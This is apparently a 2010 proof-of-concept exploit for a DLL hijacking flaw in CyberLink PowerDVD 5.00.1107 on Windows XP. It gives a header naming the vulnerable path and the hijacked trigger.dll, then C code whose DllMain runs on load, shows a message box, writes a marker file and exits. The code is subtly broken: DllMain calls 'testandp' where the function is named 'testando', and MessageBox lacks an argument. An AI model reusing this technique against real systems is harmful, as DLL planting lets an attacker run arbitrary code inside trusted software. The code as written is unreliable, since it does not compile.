/*
[*] Author: Inj3cti0n P4ck3t					          				 
[*] e-mail: fer_henrick@hotmail.com					 				 
[*] Date: 18/10/2010	
[*] Name BUG: PowerDVD 5.00.1107 DLL Hijacking Exploit (trigger.dll)
[*] System tested: Windows XP (Version 5.1 Service Pack 3)
[*] PowerDVD.exe Version: 5.00.1107
[*] Software to Download: N�o dispon�vel
[*] Application Path: C:\Arquivos de programas\CyberLink\PowerDVD\PowerDVD.exe
[*] DLL Found => trigger.dll

Greetz: fvox
*/

#include <windows.h>
#include <stdio.h>

int testando()
{
    MessageBox(0, "Testando PoC", MB_OK);
    FILE *fp;
    fp = fopen("Inj3cti0nP4ck3t.txt", "w");
    fwrite("it works ;-)", 1, 12, fp);
    fclose(fp);
    exit(1);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
    testandp();
    return TRUE;
}